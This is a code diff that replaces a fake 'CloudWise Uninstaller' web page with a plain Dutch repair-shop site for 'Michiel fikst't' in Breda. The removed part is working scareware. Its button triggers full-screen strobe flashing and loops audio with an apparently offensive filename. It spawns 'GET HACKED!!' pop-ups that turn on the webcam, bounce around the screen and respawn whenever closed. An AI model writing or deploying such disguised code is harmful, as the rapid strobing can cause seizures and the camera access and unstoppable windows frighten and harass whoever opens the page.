@@ -1,131 +1,97 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="nl">
 <head>
     <meta charset="UTF-8">
-    <title>CloudWise Uninstaller</title>
-    <style>
-        body { background: #f5f5f5; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        @keyframes strobe { 0% { background-color: #000; } 33% { background-color: #f00; } 66% { background-color: #fff; } 100% { background-color: #000; } }
-        .flash-active { animation: strobe 0.1s infinite; }
-        #box { border: 1px solid #ddd; padding: 40px; background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 500px; color: #333; border-radius: 8px; }
-        h1 { font-weight: bold; margin: 0 0 10px 0; font-size: 1.8rem; color: #2c3e50; }
-        p { margin: 5px 0; font-size: 0.95rem; color: #555; }
-        .info-section { background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 15px 0; text-align: left; }
-        button { background: #e74c3c; color: #fff; border: none; padding: 12px 20px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; border-radius: 5px; margin-top: 20px; transition: background 0.3s; }
-        button:hover { background: #c0392b; }
-        .progress-bar { width: 100%; height: 20px; background: #ecf0f1; border-radius: 3px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: #27ae60; width: 0%; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Michiel fikst't | Elektronica & E-bike Reparatie Breda</title>
+    <link rel="stylesheet" href="style.css">
 </head>
-<body id="mainBody">
+<body>
+    <header>
+        <div class="container">
+            <h1>Michiel fikst't</h1>
+            <nav>
+                <ul>
+                    <li><a href="#diensten">Diensten</a></li>
+                    <li><a href="#over-mij">Over Mij</a></li>
+                    <li><a href="#locatie">Locatie</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
 
-<div id="box">
-    <h1>🔧 CloudWise Uninstaller</h1>
-    <p>Versie 2.1.4</p>
-    <div class="info-section">
-        <p><strong>Applicatie:</strong> CloudWise Sync Manager</p>
-        <p><strong>Grootte:</strong> 247 MB</p>
-        <p><strong>Status:</strong> Geïnstalleerd</p>
-    </div>
-    <p style="text-align: center; margin-top: 20px;">Klik de knop hieronder om CloudWise volledig te verwijderen:</p>
-    <button onclick="check()">KLIK HIER OM CLOUDWISE TE VERWIJDEREN</button>
-</div>
+    <section id="hero">
+        <div class="container">
+            <h2>Jouw expert in reparatie in Breda</h2>
+            <p>Van kapotte e-bikes tot weigerende elektronica: Michiel fikst 't!</p>
+            <a href="#contact" class="btn">Maak een afspraak</a>
+        </div>
+    </section>
 
-<script>
-    const sound = new Audio("https://www.myinstants.com/media/sounds/nggr.mp3");
-    sound.loop = true;
+    <section id="diensten">
+        <div class="container">
+            <h2>Onze Diensten</h2>
+            <div class="services-grid">
+                <div class="service-card">
+                    <h3>Elektronica Reparatie</h3>
+                    <p>Heeft je laptop, tablet of ander elektronisch apparaat kuren? Ik kijk er graag naar en herstel het vakkundig.</p>
+                </div>
+                <div class="service-card">
+                    <h3>E-bike Service</h3>
+                    <p>Problemen met de motor, accu of display van je elektrische fiets? Ik zorg dat je snel weer de weg op kunt.</p>
+                </div>
+                <div class="service-card">
+                    <h3>Onderhoud</h3>
+                    <p>Voorkom problemen door regelmatig onderhoud aan je apparatuur of e-bike.</p>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    let cameraWins = [];
-    let normalWins = [];
+    <section id="over-mij" class="bg-light">
+        <div class="container">
+            <h2>Over Michiel</h2>
+            <p>Hoi, ik ben Michiel. Met een passie voor techniek en jarenlange ervaring help ik mensen in Breda en omstreken met het repareren van hun dierbare apparaten en e-bikes. Eerlijk advies en een snelle service staan bij mij voorop.</p>
+        </div>
+    </section>
 
-    function check() {
-        startChaos();
-    }
+    <section id="locatie">
+        <div class="container">
+            <h2>Locatie</h2>
+            <p>Je vindt Michiel fikst't in het hartje van Breda. Kom gerust langs of neem contact op voor het adres.</p>
+            <div class="map-placeholder">
+                <p>📍 Breda, Nederland</p>
+            </div>
+        </div>
+    </section>
 
-    function startChaos() {
-        sound.play();
-        document.getElementById('mainBody').classList.add('flash-active');
-        smartSpawn();
-        setInterval(smartSpawn, 3000);
-    }
+    <section id="contact">
+        <div class="container">
+            <h2>Contact</h2>
+            <p>Heb je een vraag of wil je direct iets laten repareren? Neem contact met me op!</p>
+            <form id="contact-form">
+                <div class="form-group">
+                    <label for="name">Naam:</label>
+                    <input type="text" id="name" name="name" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">E-mail:</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="message">Bericht:</label>
+                    <textarea id="message" name="message" required></textarea>
+                </div>
+                <button type="submit" class="btn">Verstuur</button>
+            </form>
+        </div>
+    </section>
 
-    function smartSpawn() {
-        cameraWins = cameraWins.filter(w => !w.closed);
-        normalWins = normalWins.filter(w => !w.closed);
-        if (cameraWins.length < 5) spawn(true);
-        else if (normalWins.length < 10) spawn(false);
-    }
-
-    function spawn(isCamera) {
-        const w = 350, h = 300;
-        let curX = Math.floor(Math.random() * (screen.availWidth - w));
-        let curY = Math.floor(Math.random() * (screen.availHeight - h));
-
-        const win = window.open("", "", `width=${w},height=${h},left=${curX},top=${curY}`);
-
-        if (win) {
-            win.document.write(`
-                <html>
-                <head>
-                    <style>
-                        @keyframes strobe { 0% { background:#000; } 50% { background:#f00; } 100% { background:#fff; } }
-                        body { animation: strobe 0.08s infinite; color:white; font-family:sans-serif; text-align:center; overflow:hidden; margin:0; border:10px solid black; }
-                    </style>
-                </head>
-                <body>
-                    ${isCamera ? '<video id="v" autoplay style="width:100%; height:180px; object-fit:cover;"></video>' : '<h1 style="font-size:100px;">💀</h1>'}
-                    <h1>GET HACKED!!</h1>
-                    <script>
-                        ${isCamera ? 'navigator.mediaDevices.getUserMedia({ video: true }).then(s => { document.getElementById("v").srcObject = s; });' : ''}
-                        
-                        // New absolute movement engine
-                        let x = ${curX}, y = ${curY};
-                        let dx = ${Math.random() > 0.5 ? 15 : -15}; 
-                        let dy = ${Math.random() > 0.5 ? 15 : -15};
-                        const width = 350, height = 300;
-
-                        function bounce() {
-                            x += dx;
-                            y += dy;
-
-                            // Collision detection with absolute screen bounds
-                            if (x + width >= screen.availWidth || x <= 0) {
-                                dx = -dx;
-                                // Force away from edge to prevent sticking
-                                x = (x <= 0) ? 5 : screen.availWidth - width - 5;
-                            }
-                            if (y + height >= screen.availHeight || y <= 0) {
-                                dy = -dy;
-                                // Force away from edge to prevent sticking
-                                y = (y <= 0) ? 5 : screen.availHeight - height - 5;
-                            }
-
-                            window.moveTo(x, y);
-                        }
-                        
-                        // Start moving after 10 seconds
-                        setTimeout(() => {
-                            // kick once then run repeatedly for smooth motion
-                            bounce();
-                            setInterval(bounce, 10);
-                        }, 10000);
-                    <\/script>
-                </body>
-                </html>
-            `);
-
-            if (isCamera) cameraWins.push(win);
-            else normalWins.push(win);
-
-            const checkClosed = setInterval(() => {
-                if (win.closed) {
-                    clearInterval(checkClosed);
-                    setTimeout(smartSpawn, 100);
-                    setTimeout(smartSpawn, 200);
-                }
-            }, 500);
-        }
-    }
-</script>
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Michiel fikst't. Alle rechten voorbehouden.</p>
+        </div>
+    </footer>
 </body>
 </html>
